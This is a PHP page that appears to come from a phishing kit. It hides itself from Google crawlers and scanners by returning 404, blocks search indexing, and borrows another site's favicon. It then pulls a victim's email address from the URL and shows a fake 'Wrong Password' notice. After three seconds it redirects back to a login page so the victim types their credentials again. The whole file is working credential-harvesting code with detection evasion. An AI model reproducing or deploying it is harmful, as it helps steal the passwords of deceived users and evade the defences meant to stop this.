<?php include 'blockerz.php'; 

if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false || strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false || strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'mozilla') !== false){ @header('HTTP/1.0 404 Not Found'); 
exit(); }
	
	$url="http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
    parse_str(parse_url($url, PHP_URL_QUERY));
    $parts = @explode('@', $userid);
    $user = @$parts[0];
	
header('refresh:3;url=login.php?doc=_VJOXK0QWHtoGYDw&userid='.$userid);
	
?>
<!DOCTYPE html>

<html lang="en">

<head>
<meta name="robots" content="noindex, noarchive, nofollow, nosnippet" />
    <meta name="googlebot" content="noindex, noarchive, nofollow, nosnippet, noimageindex" />
    <meta name="slurp" content="noindex, noarchive, nofollow, nosnippet, noodp, noydir" />
    <meta name="msnbot" content="noindex, noarchive, nofollow, nosnippet" />
    <meta name="teoma" content="noindex, noarchive, nofollow, nosnippet" />
<link rel="shortcut icon" href="https://www.firb.br/firb/images/favicon.ico"/>



<meta charset="utf-8">

<title>Wrong Password</title>

<style type="text/css">
body {
	width: 100%;
}

img {
	text-align: center;
}

h1 {
	text-align: center;
	color: #000;
	text-shadow: 1px 1px 1px #fff;
}

</style>
<body>
<center><img src="img/ex.png" height="50"></center>
<h1>Document is not available. Wrong Password...</h1>
</body></html>

